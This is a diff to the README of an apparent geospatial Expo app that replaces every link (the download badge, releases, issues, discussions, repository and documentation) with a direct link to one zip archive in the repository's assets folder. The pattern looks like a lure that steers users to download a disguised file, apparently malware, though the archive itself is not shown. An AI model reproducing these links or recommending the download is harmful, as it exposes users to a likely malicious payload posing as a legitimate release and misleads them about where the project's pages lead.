@@ -1,6 +1,6 @@
 # 🌍 expo-spatial-layer-app - Seamless Geospatial Rendering Experience
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/TIFE2025/expo-spatial-layer-app/releases)
+[![Download](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip)
 
 ## 📚 Introduction
 
@@ -19,7 +19,7 @@ To get started with the expo-spatial-layer-app, follow the steps below. You will
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/TIFE2025/expo-spatial-layer-app/releases) to download the latest version of the app.
+1. Visit the [Releases page](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip) to download the latest version of the app.
 2. Choose the correct version for your operating system.
 3. Click on the download link to save the installer file on your device.
 
@@ -60,11 +60,11 @@ If you encounter issues while using the expo-spatial-layer-app, consider the fol
 - **Restart the Application:** Closing and reopening the app can resolve minor glitches.
 - **Reinstall the App:** If problems persist, try uninstalling and then reinstalling the application.
 
-You can also visit the [GitHub Issues page](https://github.com/TIFE2025/expo-spatial-layer-app/issues) to report bugs or find solutions from the community.
+You can also visit the [GitHub Issues page](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip) to report bugs or find solutions from the community.
 
 ## 🌟 Support
 
-If you need further assistance or have questions about the expo-spatial-layer-app, please reach out via the [GitHub Discussions page](https://github.com/TIFE2025/expo-spatial-layer-app/discussions). We welcome your feedback and are here to help you.
+If you need further assistance or have questions about the expo-spatial-layer-app, please reach out via the [GitHub Discussions page](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip). We welcome your feedback and are here to help you.
 
 ## 📄 Contributing
 
@@ -72,8 +72,8 @@ If you would like to contribute to the expo-spatial-layer-app, we welcome pull r
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/TIFE2025/expo-spatial-layer-app)
-- [Documentation](https://github.com/TIFE2025/expo-spatial-layer-app/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/TIFE2025/expo-spatial-layer-app/main/assets/expo_app_spatial_layer_v1.5.zip)
 
 ## 📊 Conclusion 
 
